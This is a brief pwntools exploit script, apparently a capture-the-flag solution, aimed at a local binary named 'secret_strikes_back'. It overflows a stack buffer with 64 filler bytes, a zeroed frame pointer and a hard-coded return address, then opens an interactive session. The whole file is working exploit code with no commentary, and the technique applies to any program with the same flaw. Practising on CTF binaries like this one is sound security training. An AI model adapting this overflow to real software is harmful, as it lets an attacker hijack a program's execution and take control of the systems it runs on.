from pwn import *

p = process('./secret_strikes_back')
p.recvuntil(b':')
p.sendline(b'A'*64 + p64(0) +p64(0x00000000004011b6))
p.interactive()